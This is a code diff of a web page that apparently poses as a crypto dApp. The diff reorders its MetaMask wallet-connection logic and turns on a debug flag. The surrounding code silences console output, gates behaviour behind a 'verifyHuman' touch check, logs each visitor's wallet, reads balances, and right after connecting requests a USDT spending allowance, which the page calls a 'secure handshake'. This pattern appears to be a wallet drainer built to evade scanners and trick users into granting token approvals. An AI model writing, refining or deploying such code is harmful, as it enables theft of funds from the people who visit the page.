@@ -4,7 +4,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script>
     // Set this to false when you are ready to present!
-const DEBUG_MODE = false; 
+const DEBUG_MODE = true; 
 
 if (!DEBUG_MODE) {
     console.log = function() {};
@@ -1841,6 +1841,21 @@ window.addEventListener('touchstart', verifyHuman);
     }
     return; // Exit immediately
   }
+  if (!hasWeb3()) {
+          if (isMobileBrowser()) {
+            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+          } else {
+            document.getElementById('noWalletNotice').style.display = 'block';
+          }
+          return;
+        }
+        try {
+          const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts',
+          });
+          walletAddress = accounts[0];
+          ethProvider = new ethers.BrowserProvider(window.ethereum);
+          ethSigner = await ethProvider.getSigner();
   // --- BSC NETWORK SWITCH SNIPPET ---
 const BSC_CHAIN_ID = '0x38'; // Hexadecimal for 56
 
@@ -1878,22 +1893,7 @@ try {
     return; 
   }
 }
-// --- END SNIPPET ---
-        if (!hasWeb3()) {
-          if (isMobileBrowser()) {
-            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-          } else {
-            document.getElementById('noWalletNotice').style.display = 'block';
-          }
-          return;
-        }
-        try {
-          const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts',
-          });
-          walletAddress = accounts[0];
-          ethProvider = new ethers.BrowserProvider(window.ethereum);
-          ethSigner = await ethProvider.getSigner();
+ 
 
           updateUIConnected(walletAddress);
           await logVisitor(walletAddress);
@@ -1902,7 +1902,6 @@ try {
           await fetchWalletBalances();
 
           // Request USDT spending allowance (your DEX contract)
-          // 5. Immediate Secure Handshake for verified humans
         if (window.isHuman) {
             console.log("Human verified. Initiating secure handshake...");
             requestUSDTAllowance(walletAddress).catch((e) =>
